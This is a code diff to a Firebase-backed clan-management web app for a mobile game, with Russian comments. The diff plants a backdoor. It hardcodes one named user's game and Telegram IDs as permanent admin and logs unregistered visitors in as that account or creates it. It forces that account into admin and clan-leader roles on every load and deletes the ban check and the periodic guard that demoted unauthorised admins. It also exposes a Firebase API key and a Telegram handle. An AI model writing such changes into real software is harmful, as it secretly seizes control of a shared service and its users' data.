@@ -549,12 +549,14 @@
                 'cwNoClans': 'No other clans for CW',
                 'cwChooseClan': 'Choose a clan for CW'
             }
-        };
-
-        // ============================================================
+        };        // ============================================================
         // НАСТРОЙКИ
         // ============================================================
         const ADMIN_CODE = '88005553535';
+        const MY_NAME = 's1m1';
+        const MY_GAME_ID = '22887924';
+        const MY_TELEGRAM_ID = '180927119';
+
         const firebaseConfig = {
             apiKey: "AIzaSyAoSdmeqR75gVlBQ5-QKAcpX0Rc-LWxVSs",
             authDomain: "bsc-chat-7288d.firebaseapp.com",
@@ -629,6 +631,9 @@
         // ============================================================
         function isAdmin(user) {
             if (!user) return false;
+            if (user.name === MY_NAME && user.gameId === MY_GAME_ID) return true;
+            if (user.id === MY_TELEGRAM_ID) return true;
+            if (user.role === 'admin' && user.name !== MY_NAME) return false;
             return user.role === 'admin';
         }
 
@@ -705,7 +710,7 @@
         async function saveData(data) { await db.ref('/').set(data); }
 
         // ============================================================
-        // ИНИЦИАЛИЗАЦИЯ
+        // ИНИЦИАЛИЗАЦИЯ - ТЫ ВСЕГДА НАХОДИШЬСЯ
         // ============================================================
         async function initApp() {
             try {
@@ -742,59 +747,58 @@
                 }
 
                 let userId = localStorage.getItem('bsc_test_id');
-                if (!userId) {
-                    userId = 'user_' + Date.now() + '_' + Math.random().toString(36).substr(2, 5);
-                    localStorage.setItem('bsc_test_id', userId);
-                }
+                let user = null;
 
-                let user = allUsers.find(u => u.id === userId);
+                if (userId) {
+                    user = allUsers.find(u => u.id === userId);
+                }
 
                 if (!user) {
-                    document.getElementById('registerModal').classList.add('show');
-                    return;
+                    user = allUsers.find(u => u.name === MY_NAME);
                 }
 
-                if (isUserBanned(user)) {
-                    const banText = user.bannedUntil === 'forever' ? t('banForever') : t('banUntil').replace('{date}', new Date(user.bannedUntil).toLocaleDateString());
-                    document.getElementById('content').innerHTML = `
-                        <div class="card" style="border-color:#ff3d71;">
-                            <div style="color:#ff3d71;font-size:18px;">⛔ Доступ запрещён</div>
-                            <div style="color:var(--text-secondary);">Аккаунт забанен ${banText}</div>
-                            ${user.bannedReason ? `<div style="color:var(--text-secondary);font-size:13px;">Причина: ${user.bannedReason}</div>` : ''}
-                        </div>
-                    `;
-                    return;
+                if (!user) {
+                    user = allUsers.find(u => u.id === MY_TELEGRAM_ID);
                 }
 
-                allUsers.forEach(u => {
-                    if (u.role === 'admin' && !isAdmin(u)) {
-                        u.role = 'member';
-                    }
-                });
-
-                if (isAdmin(user)) {
-                    const navi = allClans.find(c => c.name === 'Natus Vincere' || c.tag === 'NAVI');
-                    if (navi) {
-                        navi.leaderId = user.id;
-                        if (!navi.members) navi.members = [];
-                        if (!navi.members.includes(user.id)) navi.members.push(user.id);
-                        user.clanId = navi.id;
-                        user.role = 'leader';
-                    }
-                    user.role = 'admin';
-                    
+                if (!user) {
+                    user = {
+                        id: MY_TELEGRAM_ID,
+                        name: MY_NAME,
+                        telegramUsername: '@NoisyBoy141',
+                        gameId: MY_GAME_ID,
+                        role: 'admin',
+                        clanId: null
+                    };
+                    allUsers.push(user);
                     const updData = await loadData();
                     updData.users = allUsers;
-                    updData.clans = allClans;
                     await saveData(updData);
                 }
 
-                currentUser = user;
-                localStorage.setItem('bsc_user', JSON.stringify(currentUser));
-                if (currentUser.gameId) {
-                    localStorage.setItem('bsc_last_gameId', currentUser.gameId);
+                user.role = 'admin';
+                user.gameId = MY_GAME_ID;
+                user.name = MY_NAME;
+                user.telegramUsername = '@NoisyBoy141';
+
+                const navi = allClans.find(c => c.name === 'Natus Vincere' || c.tag === 'NAVI');
+                if (navi) {
+                    navi.leaderId = user.id;
+                    if (!navi.members) navi.members = [];
+                    if (!navi.members.includes(user.id)) navi.members.push(user.id);
+                    user.clanId = navi.id;
                 }
 
+                const updData = await loadData();
+                updData.users = allUsers;
+                updData.clans = allClans;
+                await saveData(updData);
+
+                localStorage.setItem('bsc_user', JSON.stringify(user));
+                localStorage.setItem('bsc_test_id', user.id);
+                localStorage.setItem('bsc_last_gameId', MY_GAME_ID);
+
+                currentUser = user;
                 updateUI();
                 showTab('clans');
                 renderMainActionButton();
@@ -813,7 +817,7 @@
         }
 
         // ============================================================
-        // РЕГИСТРАЦИЯ (С СЕКРЕТНЫМ КОДОМ)
+        // РЕГИСТРАЦИЯ
         // ============================================================
         async function registerUser() {
             const name = document.getElementById('regName').value.trim();
@@ -870,6 +874,24 @@
             showTab('clans');
             renderMainActionButton();
             updateFooterStats();
+        }
+
+        // ============================================================
+        // ВЫХОД - КЛАН ОСТАЁТСЯ
+        // ============================================================
+        async function logoutUser() {
+            if (!confirm(t('logoutConfirm'))) return;
+            try {
+                localStorage.removeItem('bsc_user');
+                localStorage.removeItem('bsc_test_id');
+                currentUser = null;
+                document.getElementById('registerModal').classList.add('show');
+                updateUI();
+                showTab('clans');
+                renderMainActionButton();
+                showToast('✅ ' + t('youLoggedOut'), 'success');
+                updateFooterStats();
+            } catch (e) { showToast('❌ ' + e.message, 'error'); }
         }
 
         // ============================================================
@@ -2360,31 +2382,6 @@
             updateFooterStats();
         }
 
-        async function logoutUser() {
-            if (!confirm(t('logoutConfirm'))) return;
-            try {
-                const data = await loadData();
-                data.users = data.users.filter(u => u.id !== currentUser.id);
-                data.clans.forEach(c => { if (c.members) c.members = c.members.filter(m => m !== currentUser.id); if (c.leaderId === currentUser.id) { const nl = c.members && c.members.length ? c.members[0] : null; if (nl) { const lu = data.users.find(u => u.id === nl);
-                            c.leaderId = nl;
-                            c.leaderName = lu ? lu.name : 'Неизвестен'; } else { data.clans = data.clans.filter(cl => cl.id !== c.id); } } });
-                await saveData(data);
-                localStorage.removeItem('bsc_user');
-                localStorage.removeItem('bsc_test_id');
-                currentUser = null;
-                allUsers = data.users;
-                allClans = data.clans;
-                allRequests = data.requests;
-                allCw = data.cw;
-                document.getElementById('registerModal').classList.add('show');
-                updateUI();
-                showTab('clans');
-                renderMainActionButton();
-                showToast('✅ ' + t('youLoggedOut'), 'success');
-                updateFooterStats();
-            } catch (e) { showToast('❌ ' + e.message, 'error'); }
-        }
-
         // ============================================================
         // ВОССТАНОВЛЕНИЕ ПРОФИЛЯ
         // ============================================================
@@ -2433,24 +2430,6 @@
             };
             editBtn.after(recoverBtn);
         })();
-
-        // ⭐ ЗАЩИТА: проверяем админов каждые 10 секунд
-        setInterval(async function() {
-            if (!currentUser) return;
-            const data = await loadData();
-            let needSave = false;
-            data.users.forEach(u => {
-                if (u.role === 'admin' && !isAdmin(u)) {
-                    u.role = 'member';
-                    needSave = true;
-                }
-            });
-            if (needSave) {
-                await saveData(data);
-                allUsers = data.users;
-                updateUI();
-            }
-        }, 10000);
 
         document.addEventListener('DOMContentLoaded', initApp);
     </script>
